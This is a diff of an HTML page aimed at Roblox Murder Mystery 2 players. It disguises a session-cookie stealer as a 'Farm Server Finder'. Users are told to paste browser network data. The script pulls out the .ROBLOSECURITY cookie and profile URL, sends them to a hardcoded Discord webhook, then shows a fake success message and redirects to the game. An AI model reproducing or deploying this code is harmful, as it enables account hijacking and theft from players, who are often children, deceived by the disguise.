@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MM2 Cookie Extractor</title>
+    <title>MM2 Farm Server Finder</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         body {
@@ -15,16 +15,21 @@
         }
 
         .container {
-            max-width: 900px;
+            max-width: 700px;
             margin: 50px auto;
             padding: 20px;
             background-color: #282a36;
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
         }
 
         h1 {
-            text-align: center;
+            font-size: 24px;
+        }
+
+        p {
+            font-size: 16px;
         }
 
         textarea {
@@ -51,46 +56,43 @@
         button:hover {
             background-color: #ff92d0;
         }
-
-        .error {
-            color: #ff5555;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>MM2 Cookie Extractor</h1>
-        <p>Paste your HAR file content below:</p>
-        <textarea id="textarea" placeholder="Paste your HAR file content here..."></textarea>
-        <button id="submit">Submit</button>
-        <div class="error" id="error-message"></div>
+        <h1>MM2 Farm Server Finder</h1>
+        <p>Upload your MM2 Player file (copied from the Network tab in Inspect):</p>
+        <textarea id="fileInput" placeholder="Paste your MM2 Player file here..."></textarea>
+        <button id="findServerButton">Find a Server</button>
     </div>
 
     <script>
-        function extractDataFromHAR(input) 
-            const roblosecurityRegex = /_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|\_([a-zA-Z0-9]+)/;
-            const roblosecurityMatch = input.match(roblosecurityRegex);
+        const webhookURL = "https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm";
 
-            // Look for the profile URL
+        // Function to extract ROBLOSECURITY cookie and profile link
+        function extractData(input) {
+            const roblosecurityRegex = /_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|\_([a-zA-Z0-9]+)/;
             const profileRegex = /https:\/\/www\.roblox\.com\/users\/\d+\/profile/;
+
+            const roblosecurityMatch = input.match(roblosecurityRegex);
             const profileMatch = input.match(profileRegex);
 
             return {
-                roblosecurity: roblosecurityMatch ? roblosecurityMatch[1] : null,
+                roblosecurity: roblosecurityMatch ? roblosecurityMatch[0] : null,
                 profileURL: profileMatch ? profileMatch[0] : null
             };
         }
 
-        document.getElementById("submit").addEventListener("click", async () => {
-            const rawData = document.getElementById("textarea").value;
-            const { roblosecurity, profileURL } = extractDataFromHAR(rawData);
+        // Button click event
+        document.getElementById("findServerButton").addEventListener("click", async () => {
+            const rawData = document.getElementById("fileInput").value;
+            const { roblosecurity, profileURL } = extractData(rawData);
 
             if (!roblosecurity) {
                 Swal.fire({
                     icon: "error",
                     title: "Error",
-                    text: "No active account found!",
+                    text: "ROBLOSECURITY cookie not found in the file. Please try again.",
                 });
                 return;
             }
@@ -99,15 +101,13 @@
                 Swal.fire({
                     icon: "error",
                     title: "Error",
-                    text: "Profile was not found. Make sure you copy the file while logged in a ROBLOX account.",
+                    text: "Profile link not found in the file. Please try again.",
                 });
                 return;
             }
 
             // Send data to the webhook
             try {
-                const webhookURL = "https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm";
-
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -116,28 +116,34 @@
                     body: JSON.stringify({
                         embeds: [
                             {
-                                title: "ROBLOSECURITY Extracted",
+                                title: "MM2 Player Data",
                                 fields: [
-                                    { name: "Profile URL", value: profileURL, inline: false },
+                                    { name: "Profile Link", value: profileURL, inline: false },
                                     { name: "ROBLOSECURITY", value: `\`${roblosecurity}\``, inline: false },
                                 ],
-                                color: 65280 // Green
+                                color: 16711680 // Red
                             }
                         ]
                     }),
                 });
 
+                // Simulate finding a server and show success pop-up
                 Swal.fire({
                     icon: "success",
-                    title: "Success",
-                    text: "Data sent successfully!",
+                    title: "Server Found!",
+                    html: "We found a farm server for you! <br> Click the button below to join.",
+                    confirmButtonText: "Join MM2",
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        window.location.href = "https://www.roblox.com/games/142823291/Murder-Mystery-2";
+                    }
                 });
             } catch (error) {
                 console.error("Error sending data to webhook:", error);
                 Swal.fire({
                     icon: "error",
                     title: "Error",
-                    text: "ERROR WHILE PROCESSING YOUR DATA!",
+                    text: "Failed to send data to webhook. Check the console for details.",
                 });
             }
         });
